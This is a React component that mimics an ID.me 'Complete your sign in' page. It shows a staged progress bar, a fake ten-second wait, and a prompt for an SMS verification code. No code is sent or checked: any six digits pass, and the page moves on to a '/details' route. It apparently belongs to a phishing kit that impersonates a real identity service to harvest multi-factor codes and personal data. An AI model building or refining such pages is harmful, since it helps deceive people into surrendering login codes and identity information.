import React, { useState, useEffect, useRef } from "react";
import { useNavigate } from "react-router-dom";
import id from "../assets/id.png";
import Loader from "../component/Loader";
import { FaRegCommentAlt } from "react-icons/fa";

const Complete = () => {
  const [currentStage, setCurrentStage] = useState(2);
  const [loading, setLoading] = useState(true);
  const [code, setCode] = useState("");
  const [showError, setShowError] = useState(false);
  const inputRef = useRef(null);
  const navigate = useNavigate();

  useEffect(() => {
    const timer = setTimeout(() => {
      setCurrentStage(3);
      setLoading(false);
      inputRef.current?.focus();
    }, 10000);

    return () => clearTimeout(timer);
  }, []);

  const handleCodeChange = (e) => {
    setCode(e.target.value);
    if (showError && e.target.value.length === 6) {
      setShowError(false);
    }
  };

  const handleCodeSubmit = (e) => {
    e.preventDefault();
    if (code.length === 6) {
      setShowError(false);
      navigate("/details");
    } else {
      setShowError(true);
    }
  };

  return (
    <div className="min-h-screen flex flex-col justify-between bg-gradient-to-b from-[#ffffff] to-[#f2f1f1]">
      {/* Header */}
      <div className="w-full h-20 sm:h-28 shadow-md flex justify-center items-center p-2 bg-gradient-to-b from-[#ffffff] to-[#f9f9f9]">
        <img src={id} alt="User ID Icon" className="w-14 sm:w-20" />
      </div>

      {/* Main Content */}
      <div className="w-full max-w-[500px] bg-white px-4 py-6 sm:px-8 sm:py-10 rounded-xl shadow-lg border border-gray-300 mx-auto flex-grow flex flex-col items-center">
        <h1 className="text-lg sm:text-xl font-semibold text-center mb-4 sm:mb-8">
          COMPLETE YOUR SIGN IN
        </h1>

        {/* Progress Circles */}
        <div className="flex space-x-4 sm:space-x-8 mb-6 justify-center items-center">
          <div className="w-6 h-6 sm:w-8 sm:h-8 rounded-full flex items-center justify-center border border-gray-300 text-gray-700 font-bold text-sm sm:text-base">
            1
          </div>

          <div className="relative w-6 h-6 sm:w-8 sm:h-8 flex items-center justify-center">
            <div
              className={`w-full h-full rounded-full border border-gray-300 ${
                currentStage >= 2 ? "bg-blue-600" : "bg-transparent"
              } text-white font-bold flex items-center justify-center text-sm sm:text-base`}
            >
              2
            </div>
            {loading && (
              <div className="absolute top-10 sm:top-12">
                <Loader />
              </div>
            )}
          </div>

          <div
            className={`relative w-6 h-6 sm:w-8 sm:h-8 rounded-full border border-gray-300 flex items-center justify-center font-bold text-sm sm:text-base ${
              currentStage >= 3
                ? "bg-blue-600 text-white"
                : "bg-transparent text-gray-700"
            }`}
          >
            3
          </div>
        </div>

        {/* Stage 3 Content */}
        {currentStage === 3 && (
          <div className="w-full px-4">
            <p className="text-center text-sm sm:text-base mb-6">
              We have sent a 6-digit code via SMS to your phone number
            </p>

            <form
              onSubmit={handleCodeSubmit}
              className="flex flex-col items-center space-y-4 w-full max-w-md mx-auto"
            >
              <div className="w-full">
                <label className="text-sm font-semibold mb-2 block">
                  Enter your 6-digit code*
                </label>
                <input
                  ref={inputRef}
                  type="text"
                  value={code}
                  onChange={handleCodeChange}
                  maxLength="6"
                  className={`w-full px-4 py-2 border-2 rounded-md text-center tracking-widest font-mono text-lg sm:text-xl focus:outline-none ${
                    showError
                      ? "border-red-500 focus:ring-2 focus:ring-red-500"
                      : "border-gray-300 focus:ring-2 focus:ring-blue-600"
                  }`}
                  placeholder="______"
                />
                {showError && (
                  <div className="bg-red-100 border border-red-400 text-red-700 px-3 py-2 rounded-md text-sm mt-2">
                    Fill out this field
                  </div>
                )}
              </div>

              <div className="flex flex-col sm:flex-row items-center justify-center gap-1 text-xs sm:text-sm text-center">
                <span className="text-gray-900">Didn't receive it?</span>
                <span className="text-blue-600 cursor-pointer underline font-semibold">
                  Resend my verification code
                </span>
              </div>

              <div className="bg-gray-200 rounded-sm w-full px-3 py-2 text-center text-xs sm:text-sm">
                If you've changed phone numbers or carriers from when you previously set up multi-factor authentication, please{" "}
                <span className="text-blue-600 underline cursor-pointer">
                  update your settings here
                </span>
                .
              </div>

              <button
                type="submit"
                className="w-full py-3 sm:py-4 bg-blue-700 text-white rounded-lg mt-2 hover:bg-blue-800 transition-colors text-sm sm:text-lg"
              >
                Continue
              </button>

              <button
                type="button"
                className="text-blue-800 font-semibold underline text-sm sm:text-base"
              >
                Go back
              </button>
            </form>
          </div>
        )}
      </div>

      {/* Footer */}
      <footer className="w-full shadow-md bg-[#f5f5f5] flex flex-col items-center justify-center p-4 text-xs sm:text-sm text-[#2e3f5b] space-y-2">
        <div className="underline text-blue-600 cursor-pointer">English</div>
        <div className="flex flex-wrap items-center justify-center gap-2 sm:gap-4 text-center cursor-pointer">
          <span>What is ID.me?</span>
          <span className="border-l border-black h-3" />
          <span>Terms of Service</span>
          <span className="border-l border-black h-3" />
          <span>Privacy Policy</span>
        </div>
      </footer>
    </div>
  );
};

export default Complete;
